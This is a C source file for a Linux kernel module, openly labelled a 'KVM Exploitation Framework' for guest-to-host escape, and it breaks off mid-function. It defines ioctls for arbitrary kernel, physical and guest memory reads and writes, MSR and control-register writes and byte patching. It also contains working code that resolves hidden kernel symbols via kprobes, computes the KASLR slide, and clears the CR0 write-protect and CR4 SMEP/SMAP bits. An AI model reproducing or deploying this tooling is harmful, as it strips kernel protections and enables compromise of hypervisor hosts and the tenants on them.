/*
 * KVM Probe Driver - Core Infrastructure
 * Builds KVM exploitation primitives step by step
 * 
 * Step 1: Symbol Operations (Complete)
 * Step 2: Memory Read Operations (Complete)
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/device.h>
#include <linux/io.h>
#include <linux/slab.h>
#include <linux/errno.h>
#include <linux/mm.h>
#include <linux/types.h>
#include <linux/kvm_para.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/highmem.h>
#include <linux/pfn.h>
#include <asm/io.h>

/* x86-specific includes */
#ifdef CONFIG_X86
#include <asm/tlbflush.h>
#include <asm/processor.h>
#include <asm/msr.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 12, 0)
#include <linux/set_memory.h>
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 2, 0)
#include <asm/set_memory.h>
#endif
#endif

#define DRIVER_NAME "kvm_probe_drv"
#define DEVICE_FILE_NAME "kvm_probe_dev"
#define MAX_SYMBOL_NAME 128

MODULE_LICENSE("GPL");
MODULE_AUTHOR("KVM Exploitation Framework");
MODULE_DESCRIPTION("Step-by-step KVM exploitation framework");
MODULE_VERSION("2.0");

/* ========================================================================
 * Global Variables
 * ======================================================================== */
static int major_num = -1;
static struct class *driver_class = NULL;
static struct device *driver_device = NULL;

/* KASLR Tracking */
static unsigned long g_kaslr_slide = 0;
static unsigned long g_kernel_text_base = 0;
static bool g_kaslr_initialized = false;

/* ========================================================================
 * Symbol Database
 * ======================================================================== */

typedef struct {
    const char *name;
    unsigned long address;
    const char *description;
} kvm_symbol_t;

/* Pre-populated with provided symbols */
static kvm_symbol_t kvm_symbols[] = {
    /* KVM Hypercalls */
    {"kvm_sev_hc_page_enc_status", 0, "SEV page encryption status"},
    {"kvm_guest_apic_eoi_write", 0, "Guest APIC EOI write"},

    /* Memory Operations */
    {"kvm_read_and_reset_apf_flags", 0, "Read/reset async page fault flags"},
    {"kvm_sched_clock_read", 0, "KVM sched clock read"},
    {"kvm_disable_host_haltpoll", 0, "Disable host haltpoll"},
    {"kvm_enable_host_haltpoll", 0, "Enable host haltpoll"},

    /* Guest Memory Access - CRITICAL for guest-to-host escape */
    {"kvm_vcpu_gfn_to_hva", 0, "GFN to HVA translation"},
    {"kvm_vcpu_gfn_to_pfn_atomic", 0, "Atomic GFN to PFN"},
    {"kvm_vcpu_gfn_to_pfn", 0, "GFN to PFN"},
    {"kvm_release_page_clean", 0, "Release clean page"},
    {"kvm_release_pfn_clean", 0, "Release clean PFN"},
    {"kvm_release_page_dirty", 0, "Release dirty page"},
    {"kvm_release_pfn_dirty", 0, "Release dirty PFN"},
    {"kvm_set_pfn_dirty", 0, "Mark PFN dirty"},
    {"kvm_set_pfn_accessed", 0, "Mark PFN accessed"},
    {"kvm_read_guest_page", 0, "Read guest page"},
    {"kvm_vcpu_read_guest_page", 0, "VCPU read guest page"},
    {"kvm_read_guest", 0, "Read guest memory"},
    {"kvm_vcpu_read_guest", 0, "VCPU read guest"},
    {"kvm_vcpu_read_guest_atomic", 0, "Atomic VCPU read guest"},
    {"kvm_write_guest_page", 0, "Write guest page"},
    {"kvm_vcpu_write_guest_page", 0, "VCPU write guest page"},
    {"kvm_write_guest", 0, "Write guest memory"},
    {"kvm_vcpu_write_guest", 0, "VCPU write guest"},
    {"kvm_gfn_to_hva_cache_init", 0, "Initialize GFN to HVA cache"},
    {"kvm_write_guest_offset_cached", 0, "Write to cached guest offset"},
    {"kvm_write_guest_cached", 0, "Write cached guest memory"},
    {"kvm_read_guest_offset_cached", 0, "Read cached guest offset"},
    {"kvm_read_guest_cached", 0, "Read cached guest memory"},
    {"kvm_vcpu_mark_page_dirty", 0, "Mark guest page dirty"},

    /* I/O Operations */
    {"kvm_io_bus_write", 0, "KVM I/O bus write"},
    {"kvm_fast_pio", 0, "Fast PIO emulation"},
    {"kvm_sev_es_mmio_write", 0, "SEV-ES MMIO write"},
    {"kvm_sev_es_mmio_read", 0, "SEV-ES MMIO read"},

    /* Page Fault Handlers */
    {"kvm_inject_emulated_page_fault", 0, "Inject emulated page fault"},
    {"kvm_load_host_xsave_state", 0, "Load host XSAVE state"},
    {"kvm_read_l1_tsc", 0, "Read L1 TSC"},
    {"kvm_mmu_gva_to_gpa_read", 0, "MMU GVA to GPA (read)"},
    {"kvm_mmu_gva_to_gpa_write", 0, "MMU GVA to GPA (write)"},
    {"kvm_read_guest_virt", 0, "Read guest virtual memory"},
    {"kvm_write_guest_virt_system", 0, "Write guest virtual memory (system)"},

    /* APIC Operations */
    {"kvm_lapic_readable_reg_mask", 0, "LAPIC readable register mask"},
    {"kvm_apic_write_nodecode", 0, "APIC write no decode"},
    {"kvm_alloc_apic_access_page", 0, "Allocate APIC access page"},

    /* Hyper-V */
    {"kvm_hv_assist_page_enabled", 0, "Hyper-V assist page enabled"},
    {"kvm_hv_get_assist_page", 0, "Get Hyper-V assist page"},

    /* MMU Operations - Key for exploitation */
    {"kvm_handle_page_fault", 0, "Handle page fault"},
    {"kvm_mmu_page_fault", 0, "MMU page fault"},
    {"kvm_mmu_set_mmio_spte_mask", 0, "Set MMIO SPTE mask"},

    /* Additional useful symbols */
    {"kvm_mmu_alloc_shadow_page", 0, "Allocate shadow page"},
    {"kvm_mmu_free_shadow_page", 0, "Free shadow page"},
    {"kvm_arch_vcpu_ioctl_run", 0, "VCPU ioctl run"},
    {"vmx_vcpu_run", 0, "VMX VCPU run"},
    {"svm_vcpu_run", 0, "SVM VCPU run"},
    {"kvm_emulate_instruction", 0, "Emulate instruction"},

    /* NULL terminator */
    {NULL, 0, NULL}
};

static unsigned int kvm_symbol_count = 0;

/* VMX Handlers */
static struct {
    const char *name;
    unsigned long address;
} vmx_handlers[] = {
    {"handle_rmode_exception", 0},
    {"handle_machine_check", 0},
    {"handle_exception_nmi", 0},
    {"handle_triple_fault", 0},
    {"handle_io", 0},
    {"handle_set_cr0", 0},
    {"handle_set_cr4", 0},
    {"handle_desc", 0},
    {"handle_cr", 0},
    {"handle_dr", 0},
    {"handle_tpr_below_threshold", 0},
    {"handle_interrupt_window", 0},
    {"handle_invlpg", 0},
    {"handle_apic_access", 0},
    {"handle_apic_eoi_induced", 0},
    {"handle_apic_write", 0},
    {"handle_task_switch", 0},
    {"handle_ept_violation", 0},
    {"handle_ept_misconfig", 0},
    {"handle_nmi_window", 0},
    {"handle_invalid_guest_state", 0},
    {"handle_pause", 0},
    {"handle_monitor_trap", 0},
    {"handle_invpcid", 0},
    {"handle_pml_full", 0},
    {"handle_preemption_timer", 0},
    {"handle_vmx_instruction", 0},
    {"handle_tdx_instruction", 0},
    {"handle_encls", 0},
    {"handle_bus_lock_vmexit", 0},
    {"handle_notify", 0},
    {"handle_rdmsr_imm", 0},
    {"handle_wrmsr_imm", 0},
    {"__vmx_handle_exit", 0},
    {NULL, 0}
};

/* SVM Handlers */
static struct {
    const char *name;
    unsigned long address;
} svm_handlers[] = {
    {"svm_handle_invalid_exit", 0},
    {"svm_handle_exit", 0},
    {"svm_intr_intercept", 0},
    {"svm_nmi_intercept", 0},
    {NULL, 0}
};

/* ========================================================================
 * Kernel Symbol Lookup Compatibility
 * ======================================================================== */

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
static unsigned long (*kallsyms_lookup_name_ptr)(const char *name) = NULL;

static int kallsyms_lookup_init(void)
{
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
    };

    if (register_kprobe(&kp) < 0) {
        return -1;
    }

    kallsyms_lookup_name_ptr = (unsigned long (*)(const char *))kp.addr;
    unregister_kprobe(&kp);

    return kallsyms_lookup_name_ptr ? 0 : -1;
}

static unsigned long lookup_kernel_symbol(const char *name)
{
    return kallsyms_lookup_name_ptr ? kallsyms_lookup_name_ptr(name) : 0;
}
#else
static int kallsyms_lookup_init(void) { return 0; }
static unsigned long lookup_kernel_symbol(const char *name)
{
    return kallsyms_lookup_name(name);
}
#endif

/* ========================================================================
 * Data Structures
 * ======================================================================== */

/* Symbol lookup request */
struct symbol_request {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
    char description[256];
};

/* KVM handler info */
struct handler_info {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
    char type[32];  /* "vmx", "svm", "kvm" */
};

/* Kernel memory read request */
struct kernel_mem_read {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
};

/* Physical memory read request */
struct physical_mem_read {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
};

/* Guest memory read request (critical for guest-to-host escape) */
struct guest_mem_read {
    unsigned long gpa;          /* Guest Physical Address */
    unsigned long gva;          /* Guest Virtual Address (if available) */
    unsigned long length;
    unsigned char __user *user_buffer;
    int mode;                   /* 0 = GPA, 1 = GVA, 2 = GFN */
};

/* Memory region descriptor for scanning */
struct mem_region {
    unsigned long start;
    unsigned long end;
    unsigned long step;
    unsigned char __user *buffer;
    size_t buffer_size;
    int region_type;            /* 0 = physical, 1 = kernel, 2 = guest */
};

/* Memory pattern for scanning */
struct mem_pattern {
    unsigned char pattern[16];
    size_t pattern_len;
    int match_offset;           /* -1 for any offset */
};

/* MSR read request */
struct msr_read_request {
    unsigned int msr;
    unsigned long long value;
};

/* Pattern search request */
struct pattern_search_request {
    unsigned long start;
    unsigned long end;
    unsigned char pattern[16];
    size_t pattern_len;
    unsigned long found_addr;
};

/* Page table dump request */
struct page_table_dump {
    unsigned long virtual_addr;
    unsigned long pml4e;
    unsigned long pdpte;
    unsigned long pde;
    unsigned long pte;
    unsigned long physical_addr;
    unsigned int flags;
};

/* EPT pointer request */
struct ept_pointer_request {
    unsigned long eptp;
    unsigned long root_hpa;
    int level;
};

/* Guest register dump */
struct guest_registers {
    unsigned long rax, rbx, rcx, rdx;
    unsigned long rsi, rdi, rbp, rsp;
    unsigned long r8, r9, r10, r11;
    unsigned long r12, r13, r14, r15;
    unsigned long rip, rflags;
    unsigned long cr0, cr2, cr3, cr4;
    unsigned long dr0, dr1, dr2, dr3, dr6, dr7;
};

/* KASLR info request */
struct kaslr_info {
    unsigned long kernel_base;
    unsigned long kaslr_slide;
    unsigned long physmap_base;
    unsigned long vmalloc_base;
    unsigned long vmemmap_base;
};

/* ========================================================================
 * Memory Write Data Structures (Step 3)
 * ======================================================================== */

/* Kernel memory write request */
struct kernel_mem_write {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
    int disable_wp;              /* Disable write protection during write */
};

/* Physical memory write request */
struct physical_mem_write {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
};

/* Guest memory write request */
struct guest_mem_write {
    unsigned long gpa;           /* Guest Physical Address */
    unsigned long gva;           /* Guest Virtual Address (if available) */
    unsigned long length;
    unsigned char __user *user_buffer;
    int mode;                    /* 0 = GPA, 1 = GVA, 2 = GFN */
};

/* MSR write request */
struct msr_write_request {
    unsigned int msr;
    unsigned long long value;
};

/* CR write request */
struct cr_write_request {
    int cr_num;
    unsigned long value;
    unsigned long mask;          /* Bits to modify (0 = all bits) */
};

/* Memory set request (memset) */
struct memset_request {
    unsigned long addr;
    unsigned char value;
    unsigned long length;
    int addr_type;               /* 0 = kernel, 1 = physical */
};

/* Memory copy request */
struct memcpy_request {
    unsigned long src_addr;
    unsigned long dst_addr;
    unsigned long length;
    int src_type;                /* 0 = kernel, 1 = physical */
    int dst_type;                /* 0 = kernel, 1 = physical */
};

/* Byte patch request - for surgical modifications */
struct patch_request {
    unsigned long addr;
    unsigned char original[32];   /* Original bytes (for verification) */
    unsigned char patch[32];      /* New bytes to write */
    size_t length;
    int verify_original;          /* Verify original bytes before patching */
    int addr_type;                /* 0 = kernel, 1 = physical */
};

/* ========================================================================
 * Address Conversion Data Structures (Step 4)
 * ======================================================================== */

/* Generic address conversion request */
struct addr_conv_request {
    unsigned long input_addr;     /* Input address */
    unsigned long output_addr;    /* Output address (result) */
    int status;                   /* Conversion status/error code */
};

/* GPA to HVA conversion (requires KVM context) */
struct gpa_to_hva_request {
    unsigned long gpa;            /* Guest Physical Address */
    unsigned long hva;            /* Host Virtual Address (output) */
    unsigned long gfn;            /* Guest Frame Number (intermediate) */
    int vm_fd;                    /* KVM VM file descriptor (optional) */
    int status;
};

/* GFN to HVA conversion */
struct gfn_to_hva_request {
    unsigned long gfn;            /* Guest Frame Number */
    unsigned long hva;            /* Host Virtual Address (output) */
    int vm_fd;
    int status;
};

/* GFN to PFN conversion */
struct gfn_to_pfn_request {
    unsigned long gfn;            /* Guest Frame Number */
    unsigned long pfn;            /* Physical Frame Number (output) */
    int vm_fd;
    int status;
};

/* HVA to PFN conversion */
struct hva_to_pfn_request {
    unsigned long hva;            /* Host Virtual Address */
    unsigned long pfn;            /* Physical Frame Number (output) */
    int writable;                 /* Request writable mapping */
    int status;
};

/* Virtual to Physical conversion (kernel addresses) */
struct virt_to_phys_request {
    unsigned long virt_addr;      /* Kernel Virtual Address */
    unsigned long phys_addr;      /* Physical Address (output) */
    unsigned long pfn;            /* Page Frame Number (output) */
    unsigned long offset;         /* Page offset (output) */
    int status;
};

/* Physical to Virtual conversion */
struct phys_to_virt_request {
    unsigned long phys_addr;      /* Physical Address */
    unsigned long virt_addr;      /* Kernel Virtual Address (output) */
    int use_ioremap;              /* Use ioremap instead of phys_to_virt */
    int status;
};

/* SPTE to PFN extraction */
struct spte_to_pfn_request {
    unsigned long spte;           /* Shadow Page Table Entry */
    unsigned long pfn;            /* Extracted PFN (output) */
    unsigned long flags;          /* SPTE flags (output) */
    int present;                  /* Is page present? */
    int writable;                 /* Is page writable? */
    int executable;               /* Is page executable? */
    int status;
};

/* EPT walk request */
struct ept_walk_request {
    unsigned long eptp;           /* EPT pointer (CR3-like) */
    unsigned long gpa;            /* Guest Physical Address to translate */
    unsigned long hpa;            /* Host Physical Address (output) */
    unsigned long pml4e;          /* PML4 entry (output) */
    unsigned long pdpte;          /* PDPT entry (output) */
    unsigned long pde;            /* PD entry (output) */
    unsigned long pte;            /* PT entry (output) */
    int page_size;                /* Page size: 4K, 2M, 1G */
    int status;
};

/* GVA translation request */
struct gva_translate_request {
    unsigned long gva;            /* Guest Virtual Address */
    unsigned long gpa;            /* Guest Physical Address (output) */
    unsigned long hva;            /* Host Virtual Address (output) */
    unsigned long hpa;            /* Host Physical Address (output) */
    unsigned long cr3;            /* Guest CR3 (page table base) */
    int access_type;              /* 0=read, 1=write, 2=execute */
    int status;
};

/* Batch address conversion */
struct batch_addr_conv {
    unsigned long *input_addrs;   /* Array of input addresses */
    unsigned long *output_addrs;  /* Array of output addresses */
    int count;                    /* Number of addresses */
    int conv_type;                /* Conversion type */
    int *statuses;                /* Per-address status codes */
};

/* ========================================================================
 * IOCTL Definitions
 * ======================================================================== */

#define IOCTL_BASE 0x4000

/* Symbol operations (Step 1) */
#define IOCTL_LOOKUP_SYMBOL          (IOCTL_BASE + 0x01)
#define IOCTL_GET_SYMBOL_COUNT       (IOCTL_BASE + 0x02)
#define IOCTL_GET_SYMBOL_BY_INDEX    (IOCTL_BASE + 0x03)
#define IOCTL_FIND_SYMBOL_BY_NAME    (IOCTL_BASE + 0x04)
#define IOCTL_GET_VMX_HANDLERS       (IOCTL_BASE + 0x05)
#define IOCTL_GET_SVM_HANDLERS       (IOCTL_BASE + 0x06)
#define IOCTL_SEARCH_SYMBOLS         (IOCTL_BASE + 0x07)

/* Memory read operations (Step 2) */
#define IOCTL_READ_KERNEL_MEM         (IOCTL_BASE + 0x10)
#define IOCTL_READ_PHYSICAL_MEM       (IOCTL_BASE + 0x11)
#define IOCTL_READ_GUEST_MEM          (IOCTL_BASE + 0x12)
#define IOCTL_SCAN_MEMORY_REGION      (IOCTL_BASE + 0x13)
#define IOCTL_FIND_MEMORY_PATTERN     (IOCTL_BASE + 0x14)
#define IOCTL_READ_CR_REGISTER        (IOCTL_BASE + 0x15)
#define IOCTL_READ_MSR                (IOCTL_BASE + 0x16)
#define IOCTL_DUMP_PAGE_TABLES        (IOCTL_BASE + 0x17)
#define IOCTL_READ_EPT_POINTERS       (IOCTL_BASE + 0x18)
#define IOCTL_READ_GUEST_REGISTERS    (IOCTL_BASE + 0x19)
#define IOCTL_GET_KASLR_INFO          (IOCTL_BASE + 0x1A)
#define IOCTL_READ_PHYS_PAGE          (IOCTL_BASE + 0x1B)
#define IOCTL_READ_PFN_DATA           (IOCTL_BASE + 0x1C)

/* Memory write operations (Step 3) */
#define IOCTL_WRITE_KERNEL_MEM        (IOCTL_BASE + 0x20)
#define IOCTL_WRITE_PHYSICAL_MEM      (IOCTL_BASE + 0x21)
#define IOCTL_WRITE_GUEST_MEM         (IOCTL_BASE + 0x22)
#define IOCTL_WRITE_MSR               (IOCTL_BASE + 0x23)
#define IOCTL_WRITE_CR_REGISTER       (IOCTL_BASE + 0x24)
#define IOCTL_MEMSET_KERNEL           (IOCTL_BASE + 0x25)
#define IOCTL_MEMSET_PHYSICAL         (IOCTL_BASE + 0x26)
#define IOCTL_COPY_KERNEL_MEM         (IOCTL_BASE + 0x27)
#define IOCTL_PATCH_BYTES             (IOCTL_BASE + 0x28)
#define IOCTL_WRITE_PHYSICAL_PFN      (IOCTL_BASE + 0x29)

/* Address conversion operations (Step 4) */
#define IOCTL_GPA_TO_HVA              (IOCTL_BASE + 0x30)
#define IOCTL_GFN_TO_HVA              (IOCTL_BASE + 0x31)
#define IOCTL_GFN_TO_PFN              (IOCTL_BASE + 0x32)
#define IOCTL_GPA_TO_GFN              (IOCTL_BASE + 0x33)
#define IOCTL_GFN_TO_GPA              (IOCTL_BASE + 0x34)
#define IOCTL_HVA_TO_PFN              (IOCTL_BASE + 0x35)
#define IOCTL_HVA_TO_GFN              (IOCTL_BASE + 0x36)
#define IOCTL_PFN_TO_HVA              (IOCTL_BASE + 0x37)
#define IOCTL_VIRT_TO_PHYS            (IOCTL_BASE + 0x38)
#define IOCTL_PHYS_TO_VIRT            (IOCTL_BASE + 0x39)
#define IOCTL_VIRT_TO_PFN             (IOCTL_BASE + 0x3A)
#define IOCTL_PAGE_TO_PFN             (IOCTL_BASE + 0x3B)
#define IOCTL_PFN_TO_PAGE             (IOCTL_BASE + 0x3C)
#define IOCTL_SPTE_TO_PFN             (IOCTL_BASE + 0x3D)
#define IOCTL_WALK_EPT                (IOCTL_BASE + 0x3E)
#define IOCTL_TRANSLATE_GVA           (IOCTL_BASE + 0x3F)

/* ========================================================================
 * Symbol Database Initialization
 * ======================================================================== */

static int init_symbol_database(void)
{
    int i;

    /* Initialize KVM symbols */
    for (i = 0; kvm_symbols[i].name != NULL; i++) {
        kvm_symbols[i].address = lookup_kernel_symbol(kvm_symbols[i].name);
        if (kvm_symbols[i].address) {
            printk(KERN_INFO "%s: Found %s at 0x%lx\n",
                   DRIVER_NAME, kvm_symbols[i].name, kvm_symbols[i].address);
            kvm_symbol_count++;
        }
    }

    /* Initialize VMX handlers */
    for (i = 0; vmx_handlers[i].name != NULL; i++) {
        vmx_handlers[i].address = lookup_kernel_symbol(vmx_handlers[i].name);
        if (vmx_handlers[i].address) {
            printk(KERN_INFO "%s: VMX handler %s at 0x%lx\n",
                   DRIVER_NAME, vmx_handlers[i].name, vmx_handlers[i].address);
        }
    }

    /* Initialize SVM handlers */
    for (i = 0; svm_handlers[i].name != NULL; i++) {
        svm_handlers[i].address = lookup_kernel_symbol(svm_handlers[i].name);
        if (svm_handlers[i].address) {
            printk(KERN_INFO "%s: SVM handler %s at 0x%lx\n",
                   DRIVER_NAME, svm_handlers[i].name, svm_handlers[i].address);
        }
    }

    printk(KERN_INFO "%s: Loaded %d KVM symbols\n", DRIVER_NAME, kvm_symbol_count);
    return kvm_symbol_count > 0 ? 0 : -ENOENT;
}

/* ========================================================================
 * KASLR Handling
 * ======================================================================== */

static int init_kaslr(void)
{
    unsigned long stext_addr;

    stext_addr = lookup_kernel_symbol("_stext");
    if (!stext_addr) {
        stext_addr = lookup_kernel_symbol("_text");
    }
    if (!stext_addr) {
        stext_addr = lookup_kernel_symbol("startup_64");
    }

    if (!stext_addr) {
        printk(KERN_WARNING "%s: Could not find kernel text symbol for KASLR\n", DRIVER_NAME);
        return -ENOENT;
    }

    g_kernel_text_base = stext_addr;
    /* Standard kernel base without KASLR is 0xffffffff81000000 */
    g_kaslr_slide = stext_addr - 0xffffffff81000000UL;
    g_kaslr_initialized = true;

    printk(KERN_INFO "%s: KASLR initialized - slide: 0x%lx, kernel text: 0x%lx\n",
           DRIVER_NAME, g_kaslr_slide, g_kernel_text_base);

    return 0;
}

static inline unsigned long apply_kaslr(unsigned long unslid_addr)
{
    if (!g_kaslr_initialized) {
        return unslid_addr;
    }

    /* Kernel text addresses (0xffffffff80000000 - 0xffffffffc0000000) */
    if (unslid_addr >= 0xffffffff80000000UL && unslid_addr < 0xffffffffc0000000UL) {
        return unslid_addr + g_kaslr_slide;
    }

    return unslid_addr;
}

/* ========================================================================
 * x86 Control Register & MSR Functions
 * ======================================================================== */

#ifdef CONFIG_X86

/* Disable write protection for kernel memory access */
static unsigned long disable_wp(void)
{
    unsigned long cr0 = native_read_cr0();
    asm volatile("mov %0, %%cr0" : : "r"(cr0 & ~(1UL << 16)) : "memory");  /* Clear WP bit */
    return cr0;
}

static void restore_wp(unsigned long cr0)
{
    asm volatile("mov %0, %%cr0" : : "r"(cr0) : "memory");
}

/* Disable SMEP/SMAP temporarily */
static unsigned long disable_smep_smap(void)
{
    unsigned long cr4 = native_read_cr4();
    unsigned long new_cr4 = cr4 & ~((1UL << 20) | (1UL << 21));  /* Clear SMEP & SMAP */
    native_write_cr4(new_cr4);
    return cr4;
}

static void restore_smep_smap(unsigned long cr4)
{
    native_write_cr4(cr4);
}
#endif

/* ========================================================================
 * Memory Read Implementations
 * ======================================================================== */

/* Check if address is a valid kernel address */
static inline bool is_kernel_address(unsigned long addr)
{
    return addr >= PAGE_OFFSET;
}

/* Check if physical address is valid */
static inline bool is_valid_phys_addr(unsigned long phys_addr)
{
    return phys_addr < max_pfn << PAGE_SHIFT;
}

static inline unsigned long native_read_cr3(void)
{
    unsigned long val;
    asm volatile("mov %%cr3, %0" : "=r"(val));
    return val;
}

static unsigned long read_cr_register(int cr_num)
{
    switch (cr_num) {
        case 0: return native_read_cr0();
        case 2: return native_read_cr2();
        case 3: return native_read_cr3();
        case 4: return native_read_cr4();
        default: return 0;
    }
}

/* Read kernel memory using probe_kernel_read or direct copy */
static int read_kernel_memory(unsigned long addr, unsigned char *buffer, size_t size)
{
    if (!is_kernel_address(addr)) {
        printk(KERN_DEBUG "%s: Invalid kernel address: 0x%lx\n", DRIVER_NAME, addr);
        return -EINVAL;
    }

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 8, 0)
    /* Use copy_from_kernel_nofault for newer kernels */
    if (copy_from_kernel_nofault(buffer, (void *)addr, size)) {
        return -EFAULT;
    }
#else
    /* Use probe_kernel_read for older kernels */
    if (probe_kernel_read(buffer, (void *)addr, size)) {
        return -EFAULT;
    }
#endif

    return 0;
}

/* Read physical memory using ioremap or direct mapping */
static int read_physical_memory(unsigned long phys_addr, unsigned char *buffer, size_t size)
{
    void __iomem *mapped;
    unsigned long offset;
    size_t chunk_size;
    size_t remaining = size;
    size_t copied = 0;

    while (remaining > 0) {
        /* Map one page at a time to handle non-contiguous physical memory */
        offset = phys_addr & ~PAGE_MASK;
        chunk_size = min(remaining, (size_t)(PAGE_SIZE - offset));

        mapped = ioremap(phys_addr & PAGE_MASK, PAGE_SIZE);
        if (!mapped) {
            printk(KERN_DEBUG "%s: ioremap failed for phys 0x%lx\n", 
                   DRIVER_NAME, phys_addr);
            return copied > 0 ? 0 : -EFAULT;
        }

        memcpy_fromio(buffer + copied, mapped + offset, chunk_size);
        iounmap(mapped);

        copied += chunk_size;
        phys_addr += chunk_size;
        remaining -= chunk_size;
    }

    return 0;
}

/* Read physical memory via PFN and kmap */
static int read_physical_via_pfn(unsigned long phys_addr, unsigned char *buffer, size_t size)
{
    unsigned long pfn = phys_addr >> PAGE_SHIFT;
    unsigned long offset = phys_addr & ~PAGE_MASK;
    struct page *page;
    void *kaddr;
    size_t to_copy;
    size_t copied = 0;

    while (copied < size) {
        if (!pfn_valid(pfn)) {
            printk(KERN_DEBUG "%s: Invalid PFN: 0x%lx\n", DRIVER_NAME, pfn);
            return copied > 0 ? 0 : -EINVAL;
        }

        page = pfn_to_page(pfn);
        if (!page) {
            return copied > 0 ? 0 : -EFAULT;
        }

        kaddr = kmap_atomic(page);
        if (!kaddr) {
            return copied > 0 ? 0 : -ENOMEM;
        }

        to_copy = min(size - copied, (size_t)(PAGE_SIZE - offset));
        memcpy(buffer + copied, kaddr + offset, to_copy);
        kunmap_atomic(kaddr);

        copied += to_copy;
        pfn++;
        offset = 0;  /* Only first page might have offset */
    }

    return 0;
}

/* Read guest memory - for guest-to-host escape scenarios */
static int read_guest_memory_gpa(unsigned long gpa, unsigned char *buffer, size_t size)
{
    /*
     * In a real guest-to-host escape, we would:
     * 1. Find KVM's internal structures
     * 2. Locate the memslots for guest memory
     * 3. Translate GPA to HVA
     * 4. Read from HVA
     * 
     * For now, we try physical memory read as a fallback
     * This works if guest physical memory is identity-mapped
     */
    printk(KERN_DEBUG "%s: Reading guest GPA 0x%lx (size: %zu)\n",
           DRIVER_NAME, gpa, size);

    return read_physical_memory(gpa, buffer, size);
}

/* Read guest memory via GFN */
static int read_guest_memory_gfn(unsigned long gfn, unsigned char *buffer, size_t size)
{
    unsigned long gpa = gfn << PAGE_SHIFT;
    return read_guest_memory_gpa(gpa, buffer, size);
}

/* Scan memory region for pattern */
static int scan_memory_region(struct mem_region *region, struct mem_pattern *pattern,
                               unsigned long __user *results, int max_results)
{
    unsigned long current_addr;
    unsigned char *scan_buffer;
    size_t buffer_size = 4096;
    int found = 0;

    if (region->end <= region->start || region->step == 0) {
        return -EINVAL;
    }

    scan_buffer = kmalloc(buffer_size, GFP_KERNEL);
    if (!scan_buffer) {
        return -ENOMEM;
    }

    for (current_addr = region->start; 
         current_addr < region->end && found < max_results; 
         current_addr += region->step) {
        
        size_t to_read = min(buffer_size, region->end - current_addr);
        int ret = 0;

        /* Read memory based on region type */
        switch (region->region_type) {
            case 0:  /* Physical */
                ret = read_physical_memory(current_addr, scan_buffer, to_read);
                break;
            case 1:  /* Kernel virtual */
                ret = read_kernel_memory(current_addr, scan_buffer, to_read);
                break;
            case 2:  /* Guest */
                ret = read_guest_memory_gpa(current_addr, scan_buffer, to_read);
                break;
            default:
                ret = -EINVAL;
        }

        if (ret < 0) {
            continue;  /* Skip unreadable regions */
        }

        /* Search for pattern in buffer */
        if (to_read >= pattern->pattern_len) {
            size_t i;
            for (i = 0; i <= to_read - pattern->pattern_len; i++) {
                if (memcmp(scan_buffer + i, pattern->pattern, pattern->pattern_len) == 0) {
                    unsigned long found_addr = current_addr + i;
                    
                    if (pattern->match_offset == -1 || pattern->match_offset == (int)i) {
                        printk(KERN_INFO "%s: Pattern found at 0x%lx\n", DRIVER_NAME, found_addr);
                        
                        if (results && found < max_results) {
                            if (put_user(found_addr, results + found)) {
                                kfree(scan_buffer);
                                return -EFAULT;
                            }
                        }
                        found++;
                    }
                }
            }
        }
    }

    kfree(scan_buffer);
    return found;
}

/* Find first occurrence of pattern */
static int find_pattern_in_range(unsigned long start, unsigned long end,
                                  const unsigned char *pattern, size_t pattern_len,
                                  unsigned long *found_addr, int region_type)
{
    unsigned char *scan_buffer;
    size_t buffer_size = 4096;
    unsigned long current_addr;
    int ret;

    scan_buffer = kmalloc(buffer_size, GFP_KERNEL);
    if (!scan_buffer) {
        return -ENOMEM;
    }

    for (current_addr = start; current_addr < end; current_addr += buffer_size) {
        size_t to_read = min(buffer_size, end - current_addr);
        size_t i;

        switch (region_type) {
            case 0:  /* Physical */
                ret = read_physical_memory(current_addr, scan_buffer, to_read);
                break;
            case 1:  /* Kernel virtual */
                ret = read_kernel_memory(current_addr, scan_buffer, to_read);
                break;
            default:
                ret = -EINVAL;
        }

        if (ret < 0) {
            continue;
        }

        for (i = 0; i + pattern_len <= to_read; i++) {
            if (memcmp(scan_buffer + i, pattern, pattern_len) == 0) {
                *found_addr = current_addr + i;
                kfree(scan_buffer);
                return 0;
            }
        }
    }

    kfree(scan_buffer);
    return -ENOENT;
}

#ifdef CONFIG_X86
/* Dump page table entries for a virtual address */
static int dump_page_tables(unsigned long virt_addr, struct page_table_dump *dump)
{
    pgd_t *pgd;
    p4d_t *p4d;
    pud_t *pud;
    pmd_t *pmd;
    pte_t *pte;
    struct mm_struct *mm = current->mm;

    if (!mm) {
        mm = current->active_mm;
        if (!mm) {
            return -EINVAL;
        }
    }

    dump->virtual_addr = virt_addr;
    dump->pml4e = 0;
    dump->pdpte = 0;
    dump->pde = 0;
    dump->pte = 0;
    dump->physical_addr = 0;
    dump->flags = 0;

    pgd = pgd_offset(mm, virt_addr);
    if (pgd_none(*pgd) || pgd_bad(*pgd)) {
        return -EFAULT;
    }
    dump->pml4e = pgd_val(*pgd);

    p4d = p4d_offset(pgd, virt_addr);
    if (p4d_none(*p4d) || p4d_bad(*p4d)) {
        return -EFAULT;
    }

    pud = pud_offset(p4d, virt_addr);
    if (pud_none(*pud)) {
        return -EFAULT;
    }
    dump->pdpte = pud_val(*pud);

    if (pud_large(*pud)) {
        /* 1GB page */
        dump->physical_addr = (pud_val(*pud) & PUD_MASK) | (virt_addr & ~PUD_MASK);
        dump->flags |= 0x01;  /* Large page flag */
        return 0;
    }

    pmd = pmd_offset(pud, virt_addr);
    if (pmd_none(*pmd)) {
        return -EFAULT;
    }
